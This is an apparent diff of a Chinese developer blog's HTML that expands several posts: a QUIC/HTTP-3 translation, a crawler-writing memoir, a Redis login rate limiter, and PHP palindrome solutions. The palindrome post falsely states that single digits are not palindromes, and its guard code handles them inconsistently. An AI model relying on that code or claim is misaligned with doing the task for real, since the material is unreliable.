+<h3 id="表里的状态值很多，但是显示给用户只需要其中几个"><a href="#表里的状态值很多，但是显示给用户只需要其中几个" class="headerlink" title="表里的状态值很多，但是显示给用户只需要其中几个"></a>表里的状态值很多，但是显示给用户只需要其中几个</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getOrderStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            OrderModel::STATUS_TO_AUDIT =&gt; OrderModel::$statusMap[OrderModel::STATUS_TO_AUDIT],</span><br><span class="line">            OrderModel::STATUS_SUCCESS =&gt; OrderModel::$statusMap[OrderModel::STATUS_SUCCESS],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+          
         
       
     </div>
@@ -1046,15 +1121,50 @@ Stream
       
         
           
-          QUIC is the protocol underlying the next version of HTTPQUIC 是下一个版本 HTTP 的基础协议the Internet Engineering Task Force (IETF) has revealed that the third o
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/翻译/the-internet-changes-http-3-will-not-use-tcp-anymore/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="QUIC-is-the-protocol-underlying-the-next-version-of-HTTP"><a href="#QUIC-is-the-protocol-underlying-the-next-version-of-HTTP" class="headerlink" title="QUIC is the protocol underlying the next version of HTTP"></a>QUIC is the protocol underlying the next version of HTTP</h2><h2 id="QUIC-是下一个版本-HTTP-的基础协议"><a href="#QUIC-是下一个版本-HTTP-的基础协议" class="headerlink" title="QUIC 是下一个版本 HTTP 的基础协议"></a>QUIC 是下一个版本 HTTP 的基础协议</h2><p>the Internet Engineering Task Force (<strong>IETF</strong>) has revealed that the third official version of HyperText Transfer Protocol (HTTP) <strong>will not use TCP anymore</strong>. Instead, it will run over the QUIC protocol first developed by Google back in 2012.</p>
+<p>因特网工程工作组（Internet Engineering Task Force 简称：<strong>IETF</strong>）透露，第三个官方版本的超文本传输协议（HyperText Transfer Protocol 简称：HTTP）<strong>将不再使用 TCP</strong>。反而，它将运行 2012 年由谷歌首次开发的 QUIC 协议。</p>
+<h2 id="WHAT-IS-QUIC"><a href="#WHAT-IS-QUIC" class="headerlink" title="WHAT IS QUIC?"></a>WHAT IS QUIC?</h2><h2 id="什么是-QUIC？"><a href="#什么是-QUIC？" class="headerlink" title="什么是 QUIC？"></a>什么是 QUIC？</h2><p><strong>Quick UDP Internet Connections (QUIC)</strong> is, as its name states, a transport layer protocol based on multiplexed UDP connections. In fact, QUIC uses a combination of TCP + TLS + SPDY over UDP with several enhancements with respect to the current HTTP/2 over TCP implementation.</p>
+<p><strong>快速 UDP 因特网连接（Quick UDP Internet Connections 简称：QUIC）</strong> 是一种基于多路复用的 UDP 连接的传输层协议。事实上，QUIC 使用了 TCP + TLS + SPDY over UDP 与当前 HTTP/2 over TCP 实现的几个增强功能的组合。</p>
+<p>The <strong>IETF has been working on a standardized version of Google’s QUIC</strong> since 2016, and it was recently that they announced their intention to include it for the new HTTP/3 version. However, the IETF QUIC version already diverged significantly from the original QUIC design.</p>
+<p>IETF 自 2016 年以来一直致力于开发标准化的 Google QUIC 版本，最近他们宣布打算将其用于新的 HTTP/3 版本。然而，IETF 的 QUIC 版本已经与原来的 QUIC 设计有了很大的不同。</p>
+<p><img src="/img/review/1_E90CoPNTa24ekQ85LEyrgg.png" alt><br>Position of HTTP/3 and QUIC in the protocol stack<br>HTTP/3 和 QUIC 在协议栈中的位置</p>
+<p>QUIC protocol aims for <strong>simplicity and speed while maintaining security</strong> thanks to the TLS 1.3 encryption. They developed a more efficient protocol in terms of connection establishment and data transfer. <a href="https://docs.google.com/document/d/1gY9-YNDNAB1eip-RTPbqphgySwSNSDHLq9D5Bty4FSU/edit" target="_blank" rel="noopener">According to Google</a>, <strong>QUIC handshakes frequently require zero roundtrips</strong> before sending payload, as compared to 1–3 roundtrips for TCP+TLS. Actually, the first connection ever requires one roundtrip and the followings will work with zero.</p>
+<p>由于采用了 TLS 1.3 加密，QUIC 协议旨在简化和提高速度，同时保持安全性。他们在建立连接和数据传输方面开发了一种更有效的协议。<a href="https://docs.google.com/document/d/1gY9-YNDNAB1eip-RTPbqphgySwSNSDHLq9D5Bty4FSU/edit" target="_blank" rel="noopener">据谷歌称</a>，与 TCP + TLS 的 1-3 次往返相比，Quic握手在发送有效负载之前通常需要<strong>0次往返</strong>。实际上，第一次连接需要一次往返，下面的内容将不往返。</p>
+<p>Furthermore, it <strong>deals better with packet loss than the current TCP</strong>. Every retransmitted packet consumes a new sequence number, hence eliminating ambiguities and preventing losses from causing RTO. As <a href="https://docs.google.com/presentation/d/15e1bLKYeN56GL1oTJSF9OZiUsI-rcxisLo9dEyDkWQs/edit#slide=id.g5b4208ab1_0_272" target="_blank" rel="noopener">Jana Iyengar from IETF</a> states, QUIC is not only a redefinition of the Internet transport layer but a <strong>reinvention to do the transport right</strong>.</p>
+<p>此外，它<strong>比当前的 TCP 更能处理数据包丢失</strong>。每一个重新传输的包都会消耗一个新的序列号，因此消除了模糊性，并防止了造成 RTO 的损失。正如<a href="https://docs.google.com/presentation/d/15e1bLKYeN56GL1oTJSF9OZiUsI-rcxisLo9dEyDkWQs/edit#slide=id.g5b4208ab1_0_272" target="_blank" rel="noopener">来自 IETF 的 Jana Iyengar</a> 所说，QUIC 不仅是对互联网传输层的重新定义，而且是对实现传输权的重新定义。</p>
+<p>At the moment, only 1.2 % of the top websites support <a href="https://w3techs.com/technologies/details/ce-quic/all/all" target="_blank" rel="noopener">QUIC</a>, but they are generally high-traffic sites: almost every Google service supports their own QUIC protocol.</p>
+<p>目前，只有 1.2% 的顶级网站支持 QUIC，但它们通常是高流量的网站：几乎每个谷歌服务都支持自己的 QUIC 协议。</p>
+<h2 id="IS-QUIC-SECURE"><a href="#IS-QUIC-SECURE" class="headerlink" title="IS QUIC SECURE?"></a>IS QUIC SECURE?</h2><h2 id="QUIC-是安全的？"><a href="#QUIC-是安全的？" class="headerlink" title="QUIC 是安全的？"></a>QUIC 是安全的？</h2><p>QUIC first development included its own encryption. However, it was just a temporary implementation destined to be replaced by <strong>TLS 1.3 as described by the IETF</strong>.</p>
+<p>QUIC 的第一个开发包括它自己的加密。然而，正如 IETF 所描述的，它只是一个临时的实现，注定要被 TLS 1.3 所取代。</p>
+<p>Actually, the connection establishment strategy of QUIC is based on the combination of crypto and transport handshake.</p>
+<p>实际上，QUIC 的连接建立策略是基于加密和传输握手的结合。</p>
+<blockquote>
+<p>QUIC relies on a combined cryptographic and transport handshake to minimize connection establishment latency.</p>
+<p>QUIC 依赖于密码和传输握手的组合，以最小化连接建立延迟。</p>
+</blockquote>
+<p><img src="/img/review/1_cWUBE5wABDOeBZvajVy0eQ.png" alt><br>Integration of QUIC and TLS, adapted from the IETF’s draft of “Using Transport Layer Security (TLS) to Secure QUIC”.<br>QUIC 和 TLS 的集成，改编自 IETF 的 “使用传输层安全性（Transport Layer Security 简称：TLS）保护 QUIC” 草案。</p>
+<p>With QUIC, Everything will be encrypted by default. Nevertheless, there are indeed <strong>security risks</strong> with QUIC as with any other technology.</p>
+<p>使用 QUIC，默认情况下将加密所有内容。然而，与其他技术一样，QUIC 确实存在<strong>安全风险</strong>。</p>
+<p>The work of <a href="https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf" target="_blank" rel="noopener">Robert Lychev and Samuel Jero</a> in 2015 reported several weaknesses of the protocol. QUIC <strong>performance can be degraded by attacks</strong> like the Server Config Replay Attack. However, <strong>the confidentiality and the authenticity of the data seem to be properly secured</strong> according to their security model and tests.</p>
+<p><a href="https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf" target="_blank" rel="noopener">Robert Lychev 和 Samuel Jero</a> 在 2015 年的研究报告了该协议的几个弱点。像服务器配置重放攻击这样的攻击会<strong>降低 QUIC 性能</strong>。然而，根据安全模型和测试，数据的机密性和真实性似乎得到了适当的保护。</p>
+<p><a href="https://medium.com/drill/understanding-event-driven-architectures-eda-the-paradigm-of-the-future-7ae632f056bb" target="_blank" rel="noopener">Understanding Event-Driven Architectures (EDA): the paradigm of the future</a></p>
+<p><a href="https://medium.com/drill/understanding-event-driven-architectures-eda-the-paradigm-of-the-future-7ae632f056bb" target="_blank" rel="noopener">理解事件驱动的architectures（EDA）：“范式”</a></p>
+<p><a href="https://medium.com/drill/btc-case-study-applying-basic-digital-signal-processing-into-financial-data-ec34cd47c77b" target="_blank" rel="noopener">BITCOIN case study: applying basic Digital Signal Processing into financial data</a></p>
+<p><a href="https://medium.com/drill/btc-case-study-applying-basic-digital-signal-processing-into-financial-data-ec34cd47c77b" target="_blank" rel="noopener">BITCOIN 案例研究：将基本数字信号处理应用于金融数据</a></p>
+<p>If you want to learn more about QUIC and how it will be integrated into the next version of HTTP, I strongly recommend you to check the official documentation from Google and the drafts published by IETF. You can find them in the bibliography of this article!</p>
+<p>如果您想了解更多关于 QUIC 的信息，以及如何将其集成到下一个 HTTP 版本中，我强烈建议您查看来自 Google 的官方文档和 IETF 发布的草稿。你可以在这篇文章的参考书目中找到它们！</p>
+<p>Innovation is always spinning forward. Just like a Drill.</p>
+<p>创新总是向前旋转。就像一个练习。</p>
+<h2 id="BIBLIOGRAPHY"><a href="#BIBLIOGRAPHY" class="headerlink" title="BIBLIOGRAPHY"></a>BIBLIOGRAPHY</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] ”QUIC, a multiplexed stream transport over UDP — The Chromium Projects”, Chromium.org. [Online]. Available: <a href="https://www.chromium.org/quic" target="_blank" rel="noopener">https://www.chromium.org/quic</a>. [Accessed: 18- Nov- 2018]</p>
+<p>[2] M. Thomson, “draft-ietf-quic-transport-16 — QUIC: A UDP-Based Multiplexed and Secure Transport”, Tools.ietf.org, 2018. [Online]. Available: <a href="https://tools.ietf.org/html/draft-ietf-quic-transport-16" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-ietf-quic-transport-16</a>. [Accessed: 18- Nov- 2018]</p>
+<p>[3] S. Turner, “draft-ietf-quic-tls-03 — Using Transport Layer Security (TLS) to Secure QUIC”, Tools.ietf.org, 2018. [Online]. Available: <a href="https://tools.ietf.org/html/draft-ietf-quic-tls-03#section-3" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-ietf-quic-tls-03#section-3</a>. [Accessed: 18- Nov- 2018]</p>
+<p>[4] E. Rescorla, “The Transport Layer Security (TLS) Protocol Version 1.3”, Tools.ietf.org, 2018. [Online]. Available: <a href="https://tools.ietf.org/id/draft-ietf-tls-tls13-23.html" target="_blank" rel="noopener">https://tools.ietf.org/id/draft-ietf-tls-tls13-23.html</a>. [Accessed: 18- Nov- 2018]</p>
+<p>[5] R. Lychev, S. Jero, A. Boldyreva and C. Nita-Rotaru, “How Secure and Quick is QUIC? Provable Security and Performance Analyses”, 2015. [Online]. Available: <a href="https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf" target="_blank" rel="noopener">https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf</a>. [Accessed: 18- Nov- 2018]</p>
+<p>Nov 18, 2018 （2018-11-18）</p>
+<p>author: Telmo Subira Rodriguez</p>
+<p>link: <a href="https://medium.com/drill/the-internet-changes-http-3-will-not-use-tcp-anymore-427e82eeadc0" target="_blank" rel="noopener">https://medium.com/drill/the-internet-changes-http-3-will-not-use-tcp-anymore-427e82eeadc0</a></p>
+
+          
         
       
     </div>
@@ -1204,16 +1314,25 @@ Stream
       
         
           
-          起因第一次爬虫是因为觉得上班不忙，又不想每天玩游戏让自己后悔。所以以锻炼为目的写爬虫。因为自己尿性是没有毅力也很容易放弃的人。所以我选择的内容是抓小网站，让自己的学习不会太过于困难。那时并没有很多开发经验，也没有做所谓的启动准备。都是想到什么就去做什么，也不知道自己这个项目要做到什么程度。
-实现经过
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/回忆录/回想自己第一次写爬虫的经历/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>第一次爬虫是因为觉得上班不忙，又不想每天玩游戏让自己后悔。所以以锻炼为目的写爬虫。因为自己尿性是没有毅力也很容易放弃的人。所以我选择的内容是抓小网站，让自己的学习不会太过于困难。那时并没有很多开发经验，也没有做所谓的启动准备。都是想到什么就去做什么，也不知道自己这个项目要做到什么程度。</p>
+<h2 id="实现经过"><a href="#实现经过" class="headerlink" title="实现经过"></a>实现经过</h2><p>我的想法很简单，取得网页，匹配网页想要的内容并保存起来。因为技能问题，我没有使用 python 来抓取。我用的是 php。</p>
+<p>最开始，我使用 file_get_content() 函数来取得网页，然后用正则匹配来匹配内容，但是那太慢了，然后我就去搜了一下，使用了 curl 函数来代替了 file_get_content。</p>
+<p>我抓取的网站有三种内容：文章、图组和视频</p>
+<p>文章只需要抓取网页就可以取得内容了。但是图组不但要取得网页，还要匹配到的图片下载到本地中。当时完全就是写一个脚本文件，然后就执行。所以我分成两步脚本进行处理。但是总是被大大小小的问题卡往。后面也只做了文章和图组的抓取，也没有整理维护了。</p>
+<h2 id="碰到的问题"><a href="#碰到的问题" class="headerlink" title="碰到的问题"></a>碰到的问题</h2><h3 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h3><p>因为有些文章并不是使用 utf-8 编码，所以我们需要通过 mb_detect_encoding 函数检查网页的字符编码并用 iconv 函数转成 utf-8 的格式。</p>
+<h3 id="内存占用越过了-php-ini-的限制，导致报异常程序中断"><a href="#内存占用越过了-php-ini-的限制，导致报异常程序中断" class="headerlink" title="内存占用越过了 php.ini 的限制，导致报异常程序中断"></a>内存占用越过了 php.ini 的限制，导致报异常程序中断</h3><p>最开始我的想法是把所有得到的内容先存放在变量中，到结束后再进行一些性保存，所以导致变量存了太多数据</p>
+<h3 id="资源重复"><a href="#资源重复" class="headerlink" title="资源重复"></a>资源重复</h3><p>编码时没有考虑到脚本中断的情况，每次都是从头开始。还有一些图组资源是本来就是重复的，</p>
+<h3 id="脚本运行卡死"><a href="#脚本运行卡死" class="headerlink" title="脚本运行卡死"></a>脚本运行卡死</h3><p>下载时有网络波动、电脑休眠都会导致卡死。这种情况要么就想办法处理网络波动和电脑的问题，要么就做一些中断命令后重新运行会接着执行的操作。</p>
+<h3 id="数据丢失"><a href="#数据丢失" class="headerlink" title="数据丢失"></a>数据丢失</h3><p>文章内容存在数据库，使用的是 text 类型字段，但是抓取的内容超过了范围导致内容遗失。可以有以下 2 种办法去解决这种问题。</p>
+<ol>
+<li>设置合适的字段</li>
+<li>切换一种内容存储方式，如存成文件</li>
+</ol>
+<h2 id="扩展思考"><a href="#扩展思考" class="headerlink" title="扩展思考"></a>扩展思考</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><p>这里涉及到 session 原理。传统的网站一般都使用 session 原理来实现登录绑定。所以我们只需要把登录成功后的所有 cookie 带上，并允许 cookie 改变即可。 curl 可以进行设置</p>
+<h3 id="定时抓取"><a href="#定时抓取" class="headerlink" title="定时抓取"></a>定时抓取</h3><p>使用定时任务，并把上面说的可持续查询方法使用上即可。</p>
+<h3 id="反反爬虫"><a href="#反反爬虫" class="headerlink" title="反反爬虫"></a>反反爬虫</h3><p>有爬虫自然就会有反爬虫的机制。有的使用单一的一种机制来防止，有的又是使用混合的机制来进行制约。不管什么方式都有越过方法。主要反爬虫有：301中转、混乱的字符编码、不成对 html 标签以及请求速率限制。</p>
+
+          
         
       
     </div>
@@ -1363,16 +1482,10 @@ Stream
       
         
           
-          说明这是一个防频繁请求登录接口导致服务器性能占用过多。也可以防止别人尝试密码
-原理记录用户访问次数，到指定次数后对他进行锁处理。实现方法很简单，前端使用 cookie 进行请求记录，请求成功会把登录次数相关的 cookie 清理掉。接口端也需要一起进行记录防止直接对接口进行请求。接口端使用 redi
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/功能/login-limit/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这是一个防频繁请求登录接口导致服务器性能占用过多。也可以防止别人尝试密码</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>记录用户访问次数，到指定次数后对他进行锁处理。实现方法很简单，前端使用 cookie 进行请求记录，请求成功会把登录次数相关的 cookie 清理掉。接口端也需要一起进行记录防止直接对接口进行请求。接口端使用 redis 记录他的 IP，又用别一个键来判别锁状态。</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;auth(<span class="string">'you_password'</span>);</span><br><span class="line">$redis-&gt;select(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">$ip = get_client_ip();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($redis-&gt;get(<span class="string">"login_lock.&#123;$ip&#125;"</span>)) &#123;</span><br><span class="line">    <span class="comment">// 禁止访问接口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加访问次数</span></span><br><span class="line">$redis-&gt;incr(<span class="string">"login_count.&#123;$ip&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上锁</span></span><br><span class="line">$addLockCount = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> ($addLockCount &lt; $redis-&gt;get(<span class="string">"login_count.&#123;$ip&#125;"</span>)) &#123;</span><br><span class="line">    <span class="comment">// 锁定次数</span></span><br><span class="line">    $redis-&gt;incr(<span class="string">"login_lock_count.&#123;$ip&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 锁定次数越多，锁定时间越长</span></span><br><span class="line">    $lockTime = <span class="number">60</span> * $redis-&gt;get(<span class="string">"login_lock_count.&#123;$ip&#125;"</span>);</span><br><span class="line">    $redis-&gt;set(<span class="string">"login_lock.&#123;$ip&#125;"</span>, $ip, $lockTime);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空登录记录数</span></span><br><span class="line">    $redis-&gt;del(<span class="string">"login_count.&#123;$ip&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录成功要记得去除关联的缓存</span></span><br><span class="line">$redis-&gt;del(<span class="string">"login_count.&#123;$ip&#125;"</span>);</span><br><span class="line">$redis-&gt;del(<span class="string">"login_lock.&#123;$ip&#125;"</span>);</span><br><span class="line">$redis-&gt;del(<span class="string">"login_lock_count.&#123;$ip&#125;"</span>);</span><br></pre></td></tr></table></figure>
+          
         
       
     </div>
@@ -1522,21 +1635,25 @@ Stream
       
         
           
-          题目判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。
-示例 1:
-12输入: 121输出: true
-示例 2:
-123输入: -121输出: false解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。
-示例 3:
+            <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
+<p><strong>示例 1:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
+<p><strong>示例 2:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
+<p><strong>示例 3:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
+<p><strong>进阶</strong>:</p>
+<p>你能不将整数转为字符串来解决这个问题吗？</p>
+<p><a href="https://leetcode-cn.com/problems/reverse-integer/" target="_blank" rel="noopener">题目链接</a></p>
+<p>注： 反转回文时需注意数值溢出</p>
+<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><ul>
+<li>数学</li>
+</ul>
+<h2 id="个人解答"><a href="#个人解答" class="headerlink" title="个人解答"></a>个人解答</h2><p>如题可知单数，负数，0结尾的整数都不是回文数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1 前后数字对比</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($x &lt; <span class="number">9</span> || ($x % <span class="number">10</span> === <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $x = (string)$x;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $max = strlen($x) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $max) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x&#123;$i&#125; == $x&#123;$max&#125;) &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $max--;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2 翻转数字对比</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($x &lt; <span class="number">9</span> || ($x % <span class="number">10</span> === <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $rev_num = <span class="number">0</span>;</span><br><span class="line">    $val = $x;</span><br><span class="line">    <span class="keyword">while</span> ($val != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 注：凡是数字反转都可能会存在数字值越范围的情况</span></span><br><span class="line">        $rev_num = bcmul($rev_num, <span class="number">10</span>) + ($val % <span class="number">10</span>);<span class="comment">// ($rev_num * 10) + ($val % 10)</span></span><br><span class="line">        $val = bcdiv($val, <span class="number">10</span>); <span class="comment">// $val / 10;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ($rev_num === $x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3 数字法前后对比</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($x &lt; <span class="number">9</span> || ($x % <span class="number">10</span> === <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取 $x 的位数</span></span><br><span class="line">    $bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">9</span> &lt; bcdiv($x, $bit)) &#123; <span class="comment">// 除出来的数大于 9 就要进位</span></span><br><span class="line">        $bit = $bit * <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">9</span> &lt; $x) &#123; <span class="comment">// 除下的数如果大于 9 就还可以进行对比，如 10 的 10，个位数就不用比了</span></span><br><span class="line">        $l = bcdiv($x, $bit); <span class="comment">// $x / $bit</span></span><br><span class="line">        $r = $x % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($l != $r) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        $x = $x % $bit; <span class="comment">// 去头</span></span><br><span class="line">        $x = bcdiv($x, <span class="number">10</span>); <span class="comment">// 去尾 $x / 10</span></span><br><span class="line">        $bit = bcdiv($bit, <span class="number">100</span>); <span class="comment">// $bit / 100 = 头+尾 = 10 * 10</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="做题总结"><a href="#做题总结" class="headerlink" title="做题总结"></a>做题总结</h2><p>这到题加深了上周做的整数反转所使用的循环技巧。</p>
 
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/算法/palindrome-number/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
         
       
     </div>
@@ -1686,16 +1803,12 @@ Stream
       
         
           
-          工作中，我们总是会因为种种原因导致自己做的功能不合格需要重做。那么如何减少需要理解的偏差呢？
-思考为什么总想着做一步想一步呢很多时候我们接到任务总是忍不了自己内心的冲动，上去就是干。要么开发到一半因为一个功能细节整个程序的设计都不合理要重构，要么完成后，改了 N 次都还是没有被判断任务完成。如果我们
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/思考/如何减少需求理解的偏差/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <p>工作中，我们总是会因为种种原因导致自己做的功能不合格需要重做。那么如何减少需要理解的偏差呢？</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="为什么总想着做一步想一步呢"><a href="#为什么总想着做一步想一步呢" class="headerlink" title="为什么总想着做一步想一步呢"></a>为什么总想着做一步想一步呢</h3><p>很多时候我们接到任务总是忍不了自己内心的冲动，上去就是干。要么开发到一半因为一个功能细节整个程序的设计都不合理要重构，要么完成后，改了 N 次都还是没有被判断任务完成。如果我们接到任务时把功能的每个细节都过一遍。把不明白的地方问产品问清楚，那后面开发完后就只会是需求修改的那种修改了，这就不是自身的问题了。</p>
